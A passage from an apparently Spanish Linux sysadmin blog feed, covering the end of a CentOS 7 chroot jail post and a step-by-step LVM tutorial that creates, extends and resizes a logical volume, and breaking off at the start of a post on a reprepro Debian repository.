&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# rpm -i --root=${JAIL} --nodeps http://mirror.centos.org/centos/7/os/x86_64/Packages/centos-release-7-2.1511.el7.centos.2.10.x86_64.rpm&lt;/span&gt;
warning: Generating &lt;span class="m"&gt;12&lt;/span&gt; missing index&lt;span class="o"&gt;(&lt;/span&gt;es&lt;span class="o"&gt;)&lt;/span&gt;, please wait...
warning: /root/jail/var/tmp/rpm-tmp.Vy1z44: Header V3 RSA/SHA256 Signature, key ID f4a80eb5: NOKEY
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso consiste en instalar &lt;strong&gt;yum&lt;/strong&gt; en la jaula, que va a traer todas las dependencias necesarias para completar la jaula.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: El comando &lt;strong&gt;yum&lt;/strong&gt; busca las llaves del repositorio en &lt;em&gt;/etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7&lt;/em&gt;, y no en la jaula. Esto se puede solventar con un &lt;em&gt;link&lt;/em&gt; simbólico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# ln -s ${JAIL}/etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podemos instalar &lt;strong&gt;yum&lt;/strong&gt; y sus dependencias:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# yum --installroot=${JAIL} install -y yum&lt;/span&gt;
...
Resolving Dependencies
...
Dependencies Resolved
...
Install  &lt;span class="m"&gt;1&lt;/span&gt; Package &lt;span class="o"&gt;(&lt;/span&gt;+89 Dependent packages&lt;span class="o"&gt;)&lt;/span&gt;

Total download size: &lt;span class="m"&gt;49&lt;/span&gt; M
Installed size: &lt;span class="m"&gt;245&lt;/span&gt; M
...
Complete!
&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si queremos una jaula mas mínima todavía, en vez de &lt;em&gt;yum&lt;/em&gt; podemos instalar los paquetes necesarios, dejando que las dependencias hagan el resto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# yum --installroot=${JAIL} install bash httpd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alternativamente, se puede construir una jaula completa instalando el grupo &lt;em&gt;core&lt;/em&gt; en vez de &lt;em&gt;yum&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@mars ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# yum --installroot=${JAIL} groupinstall core&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya tenemos la jaula; es un buen momento para sacar una copia  de la carpeta.&lt;/p&gt;
&lt;h2&gt;Uso de la jaula&lt;/h2&gt;
&lt;p&gt;Esta copia es transferible a otras máquinas, aunque no sean derivadas de &lt;em&gt;RedHat&lt;/em&gt;. En este caso, la jaula se puso a funcionar en una máquina con &lt;em&gt;Debian&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Declaramos la carpeta donde tenemos la jaula, copiada o descomprimida.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@uranus ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# export JAIL=/root/jail&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@uranus ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opcionalmente, podemos copiar el esqueleto de configuración para el usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@uranus:~# cp &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;JAIL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/etc/skel/.* &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;JAIL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/root
cp: se omite el directorio «/root/jail/etc/skel/.»
cp: se omite el directorio «/root/jail/etc/skel/..»
root@uranus:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es hora de entrar en la jaula para definir la contraseña de &lt;strong&gt;root&lt;/strong&gt;, configuración de red  y otros detalles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@uranus:~# chroot &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;JAIL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; /bin/bash -l
&lt;span class="o"&gt;[&lt;/span&gt;root@uranus /&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Verificamos que estamos dentro de la jaula, por ejemplo, mirando la versión y distribución instalada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@uranus /&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# cat /etc/redhat-release &lt;/span&gt;
CentOS Linux release &lt;span class="m"&gt;7&lt;/span&gt;.2.1511 &lt;span class="o"&gt;(&lt;/span&gt;Core&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;root@uranus /&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# exit&lt;/span&gt;
root@uranus:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos instalar cualquier paquete deseado en el interior de la jaula, sea mediante el comando &lt;strong&gt;chroot&lt;/strong&gt; o el comando &lt;strong&gt;systemd-nspawn&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Finalmente, y suponiendo que hay &lt;strong&gt;systemd&lt;/strong&gt; instalado en la máquina anfitriona, podemos ejecutar la jaula como un contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@uranus:~# systemd-nspawn -b -D jail/
Spawning container jail on /root/jail.
...
Welcome to CentOS Linux &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Core&lt;span class="o"&gt;)&lt;/span&gt;!
...
CentOS Linux &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Core&lt;span class="o"&gt;)&lt;/span&gt;
Kernel &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 on an x86_64

jail login: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya tenemos nuestra jaula.&lt;/p&gt;</content><category term="linux"></category><category term="centos"></category><category term="maipo"></category><category term="jaula"></category></entry><entry><title>LVM: logical volume manager</title><link href="http://www.linuxsysadmin.ml/2016/01/lvm-logical-volume-manager.html" rel="alternate"></link><published>2016-01-18T09:00:00+01:00</published><updated>2016-01-18T09:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-01-18:/2016/01/lvm-logical-volume-manager.html</id><summary type="html">&lt;p&gt;Cuando eres un usuario medio no te complicas; particionas tu disco, a menudo usando un sistema de particionado guiado e instalas tu sistema operativo favorito. El problema es cuando las particiones se te quedan cortas. Para estos casos, se inventó una tecnología llamada &lt;em&gt;logical volume manager&lt;/em&gt;, usando sus siglas: &lt;strong&gt;LVM …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando eres un usuario medio no te complicas; particionas tu disco, a menudo usando un sistema de particionado guiado e instalas tu sistema operativo favorito. El problema es cuando las particiones se te quedan cortas. Para estos casos, se inventó una tecnología llamada &lt;em&gt;logical volume manager&lt;/em&gt;, usando sus siglas: &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;LVM es una implementación de un administrador de volúmenes lógicos para el kernel Linux. Se escribió originalmente en 1998 por Heinz Mauelshagen, que se basó en el administrador de volúmenes de Veritas usado en sistemas HP-UX.&lt;/p&gt;
&lt;p&gt;Lo que hay que saber es que las "particiones" son ahora &lt;em&gt;logical volumes&lt;/em&gt;, que son particiones de un &lt;em&gt;volume group&lt;/em&gt;. A su vez, este &lt;em&gt;volume group&lt;/em&gt; es una agrupación de discos físicos, &lt;em&gt;physical volume&lt;/em&gt; en el argot de &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La ventaja de &lt;strong&gt;LVM&lt;/strong&gt; es que podemos redimensionar nuestros &lt;em&gt;logical volumes&lt;/em&gt; (siempre que el sistema de ficheros lo permita) y que podemos añadir y quitar &lt;em&gt;physical volumes&lt;/em&gt; a nuestros &lt;em&gt;volume groups&lt;/em&gt;, a efectos de incrementar su espacio disponible.&lt;/p&gt;
&lt;p&gt;Usos frecuentes para &lt;strong&gt;LVM&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dimensionado de discos en caliente&lt;/li&gt;
&lt;li&gt;Creación de particiones de espacio limitado&lt;/li&gt;
&lt;li&gt;Capacidad para crear &lt;em&gt;snapshots point-in-time&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;Partimos de una máquina virtual con cualquier distribución &lt;em&gt;Linux&lt;/em&gt;, por ejemplo &lt;em&gt;Debian&lt;/em&gt;, que dispone de 2 discos adicionales dedicados para &lt;strong&gt;LVM&lt;/strong&gt;. Con uno bastaría, pero ya pongo los dos para tenerlo hecho cuando el tutorial avance.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# fdisk -l /dev/sdb

Disco /dev/sdb: &lt;span class="m"&gt;8&lt;/span&gt; GiB, &lt;span class="m"&gt;8589934592&lt;/span&gt; bytes, &lt;span class="m"&gt;16777216&lt;/span&gt; sectores
Unidades: sectores de &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de sector &lt;span class="o"&gt;(&lt;/span&gt;lógico/físico&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de E/S &lt;span class="o"&gt;(&lt;/span&gt;mínimo/óptimo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
root@server:~# fdisk -l /dev/sdc

Disco /dev/sdc: &lt;span class="m"&gt;4&lt;/span&gt; GiB, &lt;span class="m"&gt;4294967296&lt;/span&gt; bytes, &lt;span class="m"&gt;8388608&lt;/span&gt; sectores
Unidades: sectores de &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de sector &lt;span class="o"&gt;(&lt;/span&gt;lógico/físico&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de E/S &lt;span class="o"&gt;(&lt;/span&gt;mínimo/óptimo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los discos que forman un &lt;em&gt;volume group&lt;/em&gt; no necesitan tener el mismo tamaño; así que con uno de 8 GB y otro de 4 GB tendremos bastante.&lt;/p&gt;
&lt;p&gt;Nos aseguramos que tenemos el paquete &lt;strong&gt;lvm2&lt;/strong&gt; instalado, y si no lo estuviera, lo instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install lvm2
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Se instalarán los siguientes paquetes NUEVOS:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5 lvm2
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;5&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.530 kB de archivos.
Se utilizarán &lt;span class="m"&gt;3&lt;/span&gt;.898 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un &lt;em&gt;volume group&lt;/em&gt; con 1 solo disco. Así que primero vamos a preparar &lt;em&gt;/dev/sdb&lt;/em&gt; como &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdb 
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdb&amp;quot;&lt;/span&gt; successfully created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora creamos un &lt;em&gt;volume group&lt;/em&gt; a partir del nuevo &lt;em&gt;physical volume&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgcreate vg1 /dev/sdb 
  /proc/devices: No entry &lt;span class="k"&gt;for&lt;/span&gt; device-mapper found
  Volume group &lt;span class="s2"&gt;&amp;quot;vg1&amp;quot;&lt;/span&gt; successfully created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que tenemos un &lt;em&gt;volume group&lt;/em&gt; llamado &lt;strong&gt;vg1&lt;/strong&gt; y que dispone de 8 GB, todos ellos libres.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;8&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos gustaría que nuestros usuarios tuvieran una partición dedicada, así quedarán limitados en el espacio que pueden usar, sin molestar el resto del sistema operativo. En el argot de &lt;strong&gt;LVM&lt;/strong&gt; se trata de un &lt;em&gt;logical volume&lt;/em&gt;. Lo creamos, por ejemplo de 5 GB:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate vg1 -L 5G -n users
  Logical volume &lt;span class="s2"&gt;&amp;quot;users&amp;quot;&lt;/span&gt; created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Miramos la salida de los comandos &lt;strong&gt;lvs&lt;/strong&gt;, &lt;strong&gt;vgs&lt;/strong&gt; y &lt;strong&gt;pvs&lt;/strong&gt;: sin sorpresas. Tenemos un &lt;em&gt;logical volume&lt;/em&gt; de 5 GB, al &lt;em&gt;volume group&lt;/em&gt; le quedan 3 GB igual que al &lt;em&gt;physical volume&lt;/em&gt; subyacente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV    VG   Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-a----- &lt;span class="m"&gt;5&lt;/span&gt;,00g                                                    
root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sabiendo que ahora tenemos un dispositivo nuevo de 5 GB en &lt;em&gt;/dev/vg1-users&lt;/em&gt;, lo formateamos y lo montamos como cualquier otra partición.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkfs.ext4 /dev/mapper/vg1-users 
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se está creando El sistema de ficheros con &lt;span class="m"&gt;1310720&lt;/span&gt; 4k bloques y &lt;span class="m"&gt;327680&lt;/span&gt; nodos-i

UUID del sistema de ficheros: &lt;span class="m"&gt;44788452&lt;/span&gt;-bbb4-42e3-a5f3-4a1cfa50cabb
Respaldo del superbloque guardado en los bloques: 
    &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;, &lt;span class="m"&gt;294912&lt;/span&gt;, &lt;span class="m"&gt;819200&lt;/span&gt;, &lt;span class="m"&gt;884736&lt;/span&gt;

Reservando las tablas de grupo: hecho                           
Escribiendo las tablas de nodos-i: hecho                           
Creando el fichero de transacciones &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32768&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;: hecho
Escribiendo superbloques y la información contable del sistema de ficheros: hecho

root@server:~# tune2fs -m0 /dev/mapper/vg1-users 
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;0&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
root@server:~# mount /dev/mapper/vg1-users /home/
root@server:~# df -h /home
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;4&lt;/span&gt;,8G    10M  &lt;span class="m"&gt;4&lt;/span&gt;,8G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tal como pasa el tiempo, vemos que los 5 GB de los usuarios se nos quedan cortos y decidimos que necesitan 10 GB. Como el &lt;em&gt;volume group&lt;/em&gt; no tiene 5 GB mas, hay que ampliarlo.&lt;/p&gt;
&lt;p&gt;Así pues, ponemos otro disco en la máquina, lo preparamos como &lt;em&gt;physical volume&lt;/em&gt; y lo asignamos al &lt;em&gt;volume group&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdc
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdc&amp;quot;&lt;/span&gt; successfully created
root@server:~# vgextend vg1 /dev/sdc
  Volume group &lt;span class="s2"&gt;&amp;quot;vg1&amp;quot;&lt;/span&gt; successfully extended
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así nos queda el &lt;em&gt;volume group&lt;/em&gt;: tiene 12 GB y se compone de dos &lt;em&gt;physical volumes&lt;/em&gt;, uno de 8 GB y el otro de 4 GB, aunque para nosotros, el &lt;em&gt;volume group&lt;/em&gt; es una masa uniforme de información, sin importar en que disco cae.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize  VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;11&lt;/span&gt;,99g &lt;span class="m"&gt;6&lt;/span&gt;,99g
root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
  /dev/sdc   vg1  lvm2 a--  &lt;span class="m"&gt;4&lt;/span&gt;,00g &lt;span class="m"&gt;4&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya estamos en disposición de reclamar los 10 GB que necesitamos, asó que &lt;strong&gt;extendemos&lt;/strong&gt; el &lt;em&gt;logical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV    VG   Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-ao---- &lt;span class="m"&gt;5&lt;/span&gt;,00g                                                    
root@server:~# lvextend /dev/mapper/vg1-users -L 10G
  Size of logical volume vg1/users changed from &lt;span class="m"&gt;5&lt;/span&gt;,00 GiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1280&lt;/span&gt; extents&lt;span class="o"&gt;)&lt;/span&gt; to &lt;span class="m"&gt;10&lt;/span&gt;,00 GiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2560&lt;/span&gt; extents&lt;span class="o"&gt;)&lt;/span&gt;.
  Logical volume users successfully resized
root@server:~# lvs
  LV    VG   Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-ao---- &lt;span class="m"&gt;10&lt;/span&gt;,00g                                                    
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como curiosidad, se han absorbido 2 GB adicionales de cada &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  8,00g    0 
  /dev/sdc   vg1  lvm2 a--  4,00g 1,99g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y un último detalle: a pesar de que la nueva "partición" dispone de 10 GB, el sistema de fichero subyacente no lo sabe, y solo tiene &lt;em&gt;inodos&lt;/em&gt; para indexar 5 GB de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /home/
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;4&lt;/span&gt;,8G    10M  &lt;span class="m"&gt;4&lt;/span&gt;,8G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por suerte para nosotros, el sistema de ficheros usado es &lt;em&gt;ext4&lt;/em&gt;, que nos permite redimensionarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# resize2fs /dev/mapper/vg1-users 
resize2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
El sistema de ficheros de /dev/mapper/vg1-users está montado en /home&lt;span class="p"&gt;;&lt;/span&gt; hace falta cambiar el tamaño en línea
&lt;span class="nv"&gt;old_desc_blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;new_desc_blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
The filesystem on /dev/mapper/vg1-users is now &lt;span class="m"&gt;2621440&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;4k&lt;span class="o"&gt;)&lt;/span&gt; blocks long.

root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto, el sistema de ficheros de &lt;em&gt;/home&lt;/em&gt; ya tiene el nuevo tamaño disponible y listo para usar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /home/
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;9&lt;/span&gt;,8G    12M  &lt;span class="m"&gt;9&lt;/span&gt;,7G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda listo. Para hacer el montaje permanente, basta con añadir la línea adecuada a &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="lvm"></category><category term="logical volume manager"></category></entry><entry><title>Un repositorio de Debian con reprepro</title><link href="http://www.linuxsysadmin.ml/2016/01/un-repositorio-de-debian-con-reprepro.html" rel="alternate"></link><published>2016-01-11T08:00:00+01:00</published><updated>2016-01-11T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-01-11:/2016/01/un-repositorio-de-debian-con-reprepro.html</id><summary type="html">&lt;p&gt;Una de las grandes facilidades que nos ofrece una distribución de Linux es su sistema de gestor de paquetes. Los paquetes oficiales nos simplifican la instalación y mantenimiento de paquetes; sin embargo, podemos sacar provecho del sistema de paquetes para uso personal, para automatizar instalaciones y actualizaciones que queramos hacer …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las grandes facilidades que nos ofrece una distribución de Linux es su sistema de gestor de paquetes. Los paquetes oficiales nos simplifican la instalación y mantenimiento de paquetes; sin embargo, podemos sacar provecho del sistema de paquetes para uso personal, para automatizar instalaciones y actualizaciones que queramos hacer.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a crear un repositorio en el que podemos poner paquetes, sean sacados del repositorio oficial (para hacer de caché), o sean paquetes creados por nosotros con aplicativos propios o empaquetados a partir de paquetes no libres.&lt;/p&gt;
&lt;p&gt;Para hacerlo, necesitamos una máquina en donde pondremos el repositorio, y a efectos de demostración, una máquina en donde instalaremos paquetes de dicho repositorio. En este caso, usaremos como &lt;em&gt;LXC&lt;/em&gt; tecnología para crear las máquina virtuales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME        STATE    IPV4      IPV6  AUTOSTART  
----------------------------------------------
client      RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     YES        
repository  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2  -     YES        
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando el repositorio&lt;/h2&gt;
